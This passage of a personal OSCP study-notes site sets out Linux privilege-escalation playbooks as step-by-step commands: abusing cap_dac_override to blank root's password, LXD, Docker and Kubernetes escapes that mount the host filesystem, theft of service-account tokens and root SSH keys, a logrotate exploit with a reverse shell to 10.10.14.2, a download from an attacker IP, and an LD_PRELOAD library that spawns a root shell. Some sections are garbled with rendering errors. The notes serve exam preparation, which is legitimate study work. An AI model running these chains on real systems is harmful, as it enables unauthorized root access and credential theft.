escalation.</p></li></ul><hr><h2 id=-setting-capabilities>ğŸ”§ Setting Capabilities</h2><h3 id=command>Command</h3><p>bash</p><p>CopyEdit</p><p><code>sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</code></p><h3 id=syntax-explanation>Syntax Explanation</h3><table><thead><tr><th>Part</th><th>Meaning</th></tr></thead><tbody><tr><td><code>setcap</code></td><td>set capabilities</td></tr><tr><td><code>cap_net_bind_service</code></td><td>capability name</td></tr><tr><td><code>+ep</code></td><td>effective & permitted privileges</td></tr><tr><td><code>/usr/bin/vim.basic</code></td><td>target binary</td></tr></tbody></table><hr><h2 id=-common-dangerous-capabilities>ğŸ”§ Common Dangerous Capabilities</h2><table><thead><tr><th>Capability</th><th>Description</th></tr></thead><tbody><tr><td><code>cap_sys_admin</code></td><td>Broad admin privileges (almost full root)</td></tr><tr><td><code>cap_sys_chroot</code></td><td>Change root directory</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>Debug and attach to other processes</td></tr><tr><td><code>cap_sys_nice</code></td><td>Change process priority</td></tr><tr><td><code>cap_sys_time</code></td><td>Modify system clock</td></tr><tr><td><code>cap_sys_resource</code></td><td>Modify system resource limits</td></tr><tr><td><code>cap_sys_module</code></td><td>Load/unload kernel modules</td></tr><tr><td><code>cap_net_bind_service</code></td><td>Bind to low TCP ports</td></tr><tr><td><code>cap_setuid</code></td><td>Change effective user ID</td></tr><tr><td><code>cap_setgid</code></td><td>Change effective group ID</td></tr><tr><td><code>cap_dac_override</code></td><td>Bypass file permission checks</td></tr></tbody></table><hr><h2 id=-capability-values>ğŸ”§ Capability Values</h2><table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody><tr><td><code>=</code></td><td>Clear capability</td></tr><tr><td><code>+ep</code></td><td>Effective & Permitted privileges</td></tr><tr><td><code>+ei</code></td><td>Effective & Inheritable privileges</td></tr><tr><td><code>+p</code></td><td>Permitted only</td></tr></tbody></table><hr><h2 id=-enumerating-capabilities>ğŸ”§ Enumerating Capabilities</h2><h3 id=search-capabilities-across-common-bin-dirs>Search capabilities across common bin dirs:</h3><p>bash</p><p>CopyEdit</p><p><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;</code></p><p>secaudit@NIX02:<del>$ getcap / -r 2>/dev/null<br>/usr/bin/mtr-packet = cap_net_raw+ep<br>secaudit@NIX02:</del>$</p><h3 id=output-example>Output Example:</h3><p>bash</p><p>CopyEdit</p><p><code>/usr/bin/vim.basic cap_dac_override=eip/usr/bin/ping cap_net_raw=ep/usr/bin/mtr-packet cap_net_raw=ep</code></p><hr><h2 id=-exploiting-cap_dac_override>ğŸ”§ Exploiting <code>cap_dac_override</code></h2><ul><li><code>cap_dac_override</code> allows bypassing file read/write permission checks.</li></ul><h3 id=1-confirm-capability-on-vulnerable-binary>1ï¸âƒ£ Confirm capability on vulnerable binary:</h3><p>bash</p><p>CopyEdit</p><p><code>getcap /usr/bin/vim.basic</code></p><p>Output:</p><p>bash</p><p>CopyEdit</p><p><code>/usr/bin/vim.basic cap_dac_override=eip</code></p><hr><h3 id=2-modify-etcpasswd-using-vimbasic>2ï¸âƒ£ Modify <code>/etc/passwd</code> using vim.basic:</h3><p>bash</p><p>CopyEdit</p><p><code>/usr/bin/vim.basic /etc/passwd</code></p><ul><li>You now have write access to <code>/etc/passwd</code> without being root.</li></ul><hr><h3 id=3-modify-root-account-to-remove-password>3ï¸âƒ£ Modify root account to remove password:</h3><p>bash</p><p>CopyEdit</p><p><code>echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd</code></p><p><strong>Explanation:</strong></p><ul><li><p>Replace password hash field with empty (<code>root::</code>).</p></li><li><p><code>-es</code> â†’ non-interactive mode.</p></li></ul><hr><h3 id=4-verify>4ï¸âƒ£ Verify:</h3><p>bash</p><p>CopyEdit</p><p><code>cat /etc/passwd | head -n1</code></p><p>Expected output:</p><p>ruby</p><p>CopyEdit</p><p><code>root::0:0:root:/root:/bin/bash</code></p><hr><h3 id=5-switch-to-root-with-no-password>5ï¸âƒ£ Switch to root with no password:</h3><p>bash</p><p>CopyEdit</p><p><code>su -</code></p><hr><h2 id=-oscp-pro-tip>ğŸ›¡ OSCP Pro Tip</h2><blockquote><p><strong>Any capability that allows writing files, changing EUID, or bypassing permission checks is extremely dangerous and should be reviewed immediately when found.</strong></p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=-cron-job-abuse-oscp-privilege-escalation>ğŸ“Œ Cron Job Abuse (OSCP Privilege Escalation)</h1><hr><h2 id=-concept>ğŸ” Concept</h2><ul><li><p><strong>Cron jobs</strong> run scheduled tasks automatically.</p></li><li><p>Misconfigured cron jobs may allow low-privileged users to escalate privileges if:</p><ul><li><p>They can modify scripts run by cron.</p></li><li><p>The cron job runs as root.</p></li><li><p>The modified scripts contain injected payloads.</p></li></ul></li></ul><hr><h2 id=-crontab-syntax-oscp-quick-rule>ğŸ”§ Crontab Syntax (OSCP quick rule)</h2><table><thead><tr><th>Field</th><th>Meaning</th></tr></thead><tbody><tr><td>Minute</td><td>0â€“59</td></tr><tr><td>Hour</td><td>0â€“23</td></tr><tr><td>Day of month</td><td>1â€“31</td></tr><tr><td>Month</td><td>1â€“12</td></tr><tr><td>Day of week</td><td>0â€“7</td></tr><tr><td>Command</td><td>The command to run</td></tr></tbody></table><p>âœ… Example:</p><p>bash</p><p>CopyEdit</p><p><code>0 */12 * * * /home/admin/backup.sh</code></p><blockquote><p>Runs every 12 hours.</p></blockquote><p>âœ… Misconfigured Example:</p><p>bash</p><p>CopyEdit</p><p><code>*/3 * * * * /home/admin/backup.sh</code></p><blockquote><p>Runs every 3 minutes.</p></blockquote><hr><h2 id=-finding-cron-jobs-to-abuse>ğŸ”§ Finding Cron Jobs to Abuse</h2><h3 id=1-search-for-world-writable-files-potential-targets>1ï¸âƒ£ Search for world-writable files (potential targets):</h3><p>bash</p><p>CopyEdit</p><p><code>find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null</code></p><p>âœ… Output example:</p><p>bash</p><p>CopyEdit</p><p><code>/etc/cron.daily/backup/dmz-backups/backup.sh/home/backupsvc/backup.sh</code></p><hr><h3 id=2-observe-file-timestamps>2ï¸âƒ£ Observe file timestamps</h3><ul><li>Notice backup files being created every few minutes:</li></ul><p>bash</p><p>CopyEdit</p><p><code>ls -la /dmz-backups/</code></p><p>âœ… Example:</p><p>makefile</p><p>CopyEdit</p><p><code>www-backup-2020831-02:24:01.tgzwww-backup-2020831-02:27:01.tgz...</code></p><ul><li>This suggests the cron job runs frequently (every 3 minutes).</li></ul><hr><h3 id=3-monitor-real-time-cron-activity-using-pspy>3ï¸âƒ£ Monitor real-time cron activity using <code>pspy</code></h3><p>bash</p><p>CopyEdit</p><p><code>./pspy64 -pf -i 1000</code></p></blockquote><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=-lxd--lxc-privilege-escalation-containers>ğŸ“Œ LXD / LXC Privilege Escalation (Containers)</h1><hr><h2 id=-what-are-containers>ğŸ” What are containers?</h2><table><thead><tr><th>Containers</th><th>Virtual Machines</th></tr></thead><tbody><tr><td>Share same kernel</td><td>Full separate kernel</td></tr><tr><td>Lightweight</td><td>Heavy</td></tr><tr><td>Process-level isolation</td><td>Full hardware-level isolation</td></tr><tr><td>Easy to abuse if misconfigured</td><td>Harder to abuse</td></tr></tbody></table><p>âœ… Containers = isolated environment running inside host OS kernel.</p><hr><h1 id=-why-is-this-a-privilege-escalation-vector>ğŸ“Œ Why is this a privilege escalation vector?</h1><ul><li><p>If you&rsquo;re part of the <code>lxd</code> or <code>lxc</code> group:</p><ul><li><p>You can control container instances.</p></li><li><p>Containers can mount host file systems.</p></li><li><p>Misconfigured containers allow full root access to the host.</p></li></ul></li></ul><p>âœ… This is <strong>post-exploitation gold</strong> if you land inside any user with LXD rights.</p><hr><h1 id=-check-group-membership>ğŸ“Œ Check group membership</h1><p>bash</p><p>CopyEdit</p><p><code>id</code></p><p>âœ… If you see <code>lxd</code> or <code>lxc</code> group, you&rsquo;re likely exploitable:</p><p>sql</p><p>CopyEdit</p><p><code>uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)</code></p><hr><h1 id=-the-attack-chain>ğŸ“Œ The attack chain</h1><hr><h3 id=1-find-existing-container-templates>1ï¸âƒ£ Find existing container templates:</h3><p>bash</p><p>CopyEdit</p><p><code>ls</code></p><p>âœ… Example:</p><p>cpp</p><p>CopyEdit</p><p><code>ubuntu-template.tar.xz</code></p><hr><h3 id=2-import-image>2ï¸âƒ£ Import image:</h3><p>bash</p><p>CopyEdit</p><p><code>lxc image import ubuntu-template.tar.xz --alias ubuntutemp</code></p><hr><h3 id=3-verify-image-import>3ï¸âƒ£ Verify image import:</h3><p>bash</p><p>CopyEdit</p><p><code>lxc image list</code></p><hr><h3 id=4-initialize-privileged-container>4ï¸âƒ£ Initialize privileged container</h3><p>âœ… Critical part: disable isolation</p><p>bash</p><p>CopyEdit</p><p><code>lxc init ubuntutemp privesc -c security.privileged=true</code></p><ul><li>This allows container to fully access host kernel features.</li></ul><hr><h3 id=5-mount-host-root-filesystem-inside-container>5ï¸âƒ£ Mount host root filesystem inside container</h3><p>bash</p><p>CopyEdit</p><p><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></p><p>âœ… This mounts hostâ€™s <code>/</code> directory inside the container at <code>/mnt/root/</code>.</p><hr><h3 id=6-start-container-1>6ï¸âƒ£ Start container</h3><p>bash</p><p>CopyEdit</p><p><code>lxc start privesc</code></p><hr><h3 id=7-get-shell-inside-container>7ï¸âƒ£ Get shell inside container</h3><p>bash</p><p>CopyEdit</p><p><code>lxc exec privesc /bin/bash</code></p><p>âœ… You are now root <em>inside container</em> with access to mounted host filesystem.</p><hr><h3 id=8-access-host-filesystem-as-root>8ï¸âƒ£ Access host filesystem as root</h3><p>bash</p><p>CopyEdit</p><p><code>cd /mnt/rootls -la</code></p><p>âœ… You can now modify host files, edit <code>/etc/passwd</code>, add users, drop SSH keys â€” full root.</p><hr><h1 id=-oscp-one-liner-summary-for-joplin>ğŸ“Œ OSCP One-Liner Summary for Joplin:</h1><blockquote><p>LXD/LXC allows privileged containers to mount host filesystem. If you&rsquo;re in <code>lxd</code> group, you can escalate to host root by creating a privileged container, mounting <code>/</code> and modifying host system directly.</p></blockquote><hr><h1 id=-full-one-shot-attack-flow-for-your-joplin>ğŸ“Œ Full One-Shot Attack Flow (for your Joplin):</h1><p>bash</p><p>CopyEdit</p><p><code># Check for lxd group membershipid# Import existing template imagelxc image import ubuntu-template.tar.xz --alias ubuntutemp# Initialize privileged containerlxc init ubuntutemp privesc -c security.privileged=true# Mount host filesystemlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true# Start containerlxc start privesc# Enter container shelllxc exec privesc /bin/bash# Access host filesystemcd /mnt/root</code></p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>id  
</span></span><span style=display:flex><span>lxc image import ubuntu-template.tar.xz --alias ubuntutemp  
</span></span><span style=display:flex><span>lxc init ubuntutemp privesc -c security.privileged<span style=color:#f92672>=</span>true  
</span></span><span style=display:flex><span>lxc config device add privesc host-root disk source<span style=color:#f92672>=</span>/ path<span style=color:#f92672>=</span>/mnt/root recursive<span style=color:#f92672>=</span>true  
</span></span><span style=display:flex><span>lxc start privesc  
</span></span><span style=display:flex><span>lxc exec privesc -- /bin/bash  
</span></span><span style=display:flex><span>cd /mnt/root</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=docker>Docker</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0><code># âœ… Check if you&#39;re in docker group
id

# âœ… List Docker images
docker image ls

# âœ… List Docker containers
docker ps -a

# âœ… Mount host filesystem &amp; escape to host root via chroot (main privesc one-liner)
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# âœ… If Docker socket exposed (inside container)
ls -al /app/docker.sock  # or /var/run/docker.sock

# âœ… If Docker binary missing inside container, upload it
wget https://&lt;attacker-ip&gt;:443/docker -O docker
chmod +x docker

# âœ… List running containers via docker socket inside container
/tmp/docker -H unix:///app/docker.sock ps

# âœ… Launch new privileged container mounting host filesystem inside container
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

# âœ… Get shell inside new privileged container
/tmp/docker -H unix:///app/docker.sock exec -it &lt;container-id&gt; /bin/bash

# âœ… Navigate to host filesystem from inside privileged container
cd /hostsystem

# âœ… Extract private keys from host (example)
cat /hostsystem/root/.ssh/id_rsa</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=kubernetes-k8s-summary-for-pentesting>Kubernetes (K8s) Summary for Pentesting</h1><h2 id=overview>Overview</h2><ul><li>Kubernetes (K8s) is an open-source container orchestration platform.</li><li>Developed by Google; now under Cloud Native Computing Foundation.</li><li>Manages deployment, scaling, and management of containerized applications.</li><li>Provides features like:<br>Â Â - Load balancing<br>Â Â - Service discovery<br>Â Â - Storage orchestration<br>Â Â - Self-healing<br>Â Â - RBAC (Role-Based Access Control)<br>Â Â - Network Policies<br>Â Â - Security Contexts</li></ul><hr><h2 id=kubernetes-architecture>Kubernetes Architecture</h2><h3 id=control-plane-master-node>Control Plane (Master Node)</h3><p>Responsible for managing the cluster:</p><table><thead><tr><th>Component</th><th>Port</th></tr></thead><tbody><tr><td>etcd</td><td>2379, 2380</td></tr><tr><td>API server</td><td>6443</td></tr><tr><td>Scheduler</td><td>10251</td></tr><tr><td>Controller Manager</td><td>10252</td></tr><tr><td>Kubelet API</td><td>10250</td></tr><tr><td>Read-Only Kubelet API</td><td>10255</td></tr></tbody></table><h3 id=worker-nodes-minions>Worker Nodes (Minions)</h3><ul><li>Run containerized apps.</li><li>Receive instructions from the Control Plane.</li><li>Execute workloads.</li></ul><hr><h2 id=key-concepts>Key Concepts</h2><ul><li><strong>Pods</strong>: Smallest deployable units (can contain one or more containers).</li><li><strong>Namespaces</strong>: Logical separation of cluster resources.</li><li><strong>API Resources</strong>: Pods, Services, Deployments, etc.</li></ul><hr><h2 id=kubernetes-vs-docker>Kubernetes vs Docker</h2><table><thead><tr><th>Function</th><th>Docker</th><th>Kubernetes</th></tr></thead><tbody><tr><td>Purpose</td><td>Container platform</td><td>Container orchestration</td></tr><tr><td>Scaling</td><td>Manual</td><td>Automatic</td></tr><tr><td>Networking</td><td>Simple</td><td>Complex w/ policies</td></tr><tr><td>Storage</td><td>Volumes</td><td>Multiple storage options</td></tr></tbody></table><hr><h2 id=kubernetes-api>Kubernetes API</h2><ul><li>API server handles all requests (<code>kubectl</code>, REST, etc.).</li><li>Supports declarative configuration.</li><li>REST operations: GET, POST, PUT, PATCH, DELETE.</li></ul><h3 id=authentication>Authentication</h3><ul><li>Supports:<br>Â Â - Client certificates<br>Â Â - Bearer tokens<br>Â Â - Authenticating proxy<br>Â Â - HTTP basic auth</li><li>Uses RBAC for authorization.</li></ul><h3 id=anonymous-access>Anonymous Access</h3><ul><li>By default, Kubelet allows anonymous access.</li><li>Anonymous requests are unauthenticated:<br>Â Â ```bash<br>Â Â curl https://:6443 -k<br>Kubelet API Pentesting<br>Extracting Pods via Kubelet API<br>bash<br>Copy<br>Edit<br>curl https://:10250/pods -k | jq .<br>Output includes pod names, namespaces, containers, configs, and secrets.</li></ul><p>Extracting Pods via kubeletctl<br>bash<br>Copy<br>Edit<br>kubeletctl -i &ndash;server pods<br>Scanning for RCE<br>bash<br>Copy<br>Edit<br>kubeletctl -i &ndash;server scan rce<br>Example Output:<br>Node IP PODS Namespace Containers RCE<br>10.129.10.11 nginx default nginx +<br>etcd-steamcloud kube-system etcd -</p><p>Gaining Shell Access (if vulnerable to RCE)<br>bash<br>Copy<br>Edit<br>kubeletctl -i &ndash;server exec &ldquo;id&rdquo; -p nginx -c nginx<br>If output: uid=0(root) gid=0(root), container is running as root.</p><p>Privilege Escalation<br>Extracting Service Account Token<br>bash<br>Copy<br>Edit<br>kubeletctl -i &ndash;server exec &ldquo;cat /var/run/secrets/kubernetes.io/serviceaccount/token&rdquo; -p nginx -c nginx | tee -a k8.token<br>Extracting CA Certificate<br>bash<br>Copy<br>Edit<br>kubeletctl &ndash;server exec &ldquo;cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt&rdquo; -p nginx -c nginx | tee -a ca.crt<br>Checking Permissions<br>bash<br>Copy<br>Edit<br>export token=<code>cat k8.token</code><br>kubectl &ndash;token=$token &ndash;certificate-authority=ca.crt &ndash;server=https://:6443 auth can-i &ndash;list If allowed to create pods, create a malicious pod: privesc.yaml yaml Copy Edit apiVersion: v1 kind: Pod metadata: Â Â name: privesc Â Â namespace: default spec: Â Â containers: Â Â - name: privesc Â Â Â Â image: nginx:1.14.2 Â Â Â Â volumeMounts: Â Â Â Â - mountPath: /root Â Â Â Â Â Â name: mount-root-into-mnt Â Â volumes: Â Â - name: mount-root-into-mnt Â Â Â Â hostPath: Â Â Â Â Â Â Â path: / Â Â automountServiceAccountToken: true Â Â hostNetwork: true Deploy the pod bash Copy Edit kubectl &ndash;token=$</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;&&rsquo; at position 55: â€¦server=https://&Ì²lt;k8s-api-ip&amp;gâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;&&rsquo; at position 55: â€¦server=https://&Ì²lt;k8s-api-ip&amp;gâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;&&rsquo; at position 55: â€¦server=https://&Ì²lt;k8s-api-ip&amp;gâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;&&rsquo; at position 55: â€¦server=https://&Ì²lt;k8s-api-ip&amp;gâ€¦</p><p>token &ndash;certificate-authority=ca.crt &ndash;server=https://:6443 apply -f privesc.yaml<br>Verify running pods<br>bash<br>Copy<br>Edit<br>kubectl &ndash;token=$token &ndash;certificate-authority=ca.crt &ndash;server=https://:6443 get pods<br>Extract Host Files (e.g., SSH key)<br>bash<br>Copy<br>Edit<br>kubeletctl &ndash;server exec &ldquo;cat /root/root/.ssh/id_rsa&rdquo; -p privesc -c privesc<br>Summary<br>Kubernetes pentesting often revolves around gaining access to Kubelet or API server.</p><p>Kubelet API is a key attack surface.</p><p>Privilege escalation can be performed via pod creation and hostPath mounts.</p><p>Service account tokens and certificates are valuable assets for lateral movement.</p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h2 id=exploiting-logrotate-privilege-escalation>Exploiting Logrotate (Privilege Escalation)</h2><h3 id=conditions-for-exploitation>Conditions for exploitation:</h3><ul><li><p>Writable log file.</p></li><li><p><code>logrotate</code> runs as root.</p></li><li><p>Vulnerable versions:</p><ul><li><p>3.8.6</p></li><li><p>3.11.0</p></li><li><p>3.15.0</p></li><li><p>3.18.0</p></li></ul></li></ul><h3 id=exploit-logrotten>Exploit: <strong>logrotten</strong></h3><h4 id=download--compile>Download & Compile:</h4><p>bash</p><p>CopyEdit</p><p><code>git clone https://github.com/whotwagner/logrotten.gitcd logrottengcc logrotten.c -o logrotten</code></p><h4 id=prepare-payload-example-reverse-shell>Prepare payload (example: reverse shell):</h4><p>bash</p><p>CopyEdit</p><p><code>echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&amp;1' > payload</code></p><h4 id=check-create-or-compress-optionmethod-used-by-logrotate>Check <code>create</code> or <code>compress</code> option(method used by logrotate):</h4><p>bash</p><p>CopyEdit</p><p><code>grep "create\|compress" /etc/logrotate.conf | grep -v "#"</code></p><h4 id=start-listener-on-attack-box>Start listener on attack box:</h4><p>bash</p><p>CopyEdit</p><p><code>nc -nlvp 9001</code></p><h4 id=run-the-exploit>Run the exploit:</h4><p>bash</p><p>CopyEdit</p><p><code>./logrotten -p ./payload /tmp/tmp.log</code></p><h4 id=on-listener-attacker-machine>On listener (attacker machine):</h4><p>bash</p><p>CopyEdit</p><p><code># iduid=0(root) gid=0(root) groups=0(root)</code></p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h2 id=ld_preload-privilege-escalation>LD_PRELOAD Privilege Escalation</h2><p>Let&rsquo;s see an example of how we can utilize the <a href=https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html rel=external>LD_PRELOAD</a> environment variable to escalate privileges. For this, we need a user with <code>sudo</code> privileges.</p><p>Shared Libraries</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ sudo -l
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Matching Defaults entries for daniel.carter on NIX02:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>User daniel.carter may run the following commands on NIX02:
</span></span><span style=display:flex><span>    (root) NOPASSWD: /usr/sbin/apache2 restart
</span></span></code></pre></div><p>This user has rights to restart the Apache service as root, but since this is <code>NOT</code> a <a href=https://gtfobins.github.io/#apache rel=external>GTFOBin</a> and the <code>/etc/sudoers</code> entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the <code>LD_PRELOAD</code> issue to run a custom shared library file. Let&rsquo;s compile the following library:</p><p>Code: c</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>_init</span>() {
</span></span><span style=display:flex><span><span style=color:#a6e22e>unsetenv</span>(<span style=color:#e6db74>&#34;LD_PRELOAD&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>setgid</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>setuid</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>);
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>We can compile this as follows:</p><p>Shared Libraries</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
</span></span></code></pre></div><p>Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.</p><p>Shared Libraries</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>id
</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></div><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=../../><div class=logo-title style=display:flex;align-items:center><img src=../../images/logo.png alt=Logo style=width:90px;height:80>
<span>DrakonOps</span></div></a></div><search><form action=../../search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-url=../../index.html><a class=padding href=../../index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li class=parent data-nav-url=../../oscp-notes/index.html><input type=checkbox id=R-section-5f51e3ac21bcc264f305c28eac7484ea aria-controls=R-subsections-5f51e3ac21bcc264f305c28eac7484ea checked><label for=R-section-5f51e3ac21bcc264f305c28eac7484ea><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu OSCP Notes</span></label><a class=padding href=../../oscp-notes/index.html>OSCP Notes<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-5f51e3ac21bcc264f305c28eac7484ea class=collapsible-menu><li data-nav-url=../../oscp-notes/main-methodology/index.html><a class=padding href=../../oscp-notes/main-methodology/index.html>main methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/methodology/index.html><a class=padding href=../../oscp-notes/methodology/index.html>methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/project/index.html><a class=padding href=../../oscp-notes/project/index.html>project<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html><a class=padding href=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html>footprinting and finger printing web apps<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nmap/index.html><a class=padding href=../../oscp-notes/nmap/index.html>nmap<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/go-busters/index.html><a class=padding href=../../oscp-notes/go-busters/index.html>Go busters<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/dns/index.html><a class=padding href=../../oscp-notes/dns/index.html>dns<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smb/index.html><a class=padding href=../../oscp-notes/smb/index.html>smb<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nfs/index.html><a class=padding href=../../oscp-notes/nfs/index.html>nfs<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ftp/index.html><a class=padding href=../../oscp-notes/ftp/index.html>ftp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smtp/index.html><a class=padding href=../../oscp-notes/smtp/index.html>smtp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/snmp/index.html><a class=padding href=../../oscp-notes/snmp/index.html>snmp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/imap-and-pop/index.html><a class=padding href=../../oscp-notes/imap-and-pop/index.html>imap and pop<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/mssql/index.html><a class=padding href=../../oscp-notes/mssql/index.html>mssql<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/oracle-databases-tns/index.html><a class=padding href=../../oscp-notes/oracle-databases-tns/index.html>oracle databases TNS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ipmi/index.html><a class=padding href=../../oscp-notes/ipmi/index.html>IPMI<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/vhosts/index.html><a class=padding href=../../oscp-notes/vhosts/index.html>vhosts<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/web-attacks/index.html><a class=padding href=../../oscp-notes/web-attacks/index.html>Web Attacks<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/xss/index.html><a class=padding href=../../oscp-notes/xss/index.html>XSS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/login-brute-force-wordlists/index.html><a class=padding href=../../oscp-notes/login-brute-force-wordlists/index.html>login brute force wordlists<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/crackmapexec/index.html><a class=padding href=../../oscp-notes/crackmapexec/index.html>crackmapexec<i 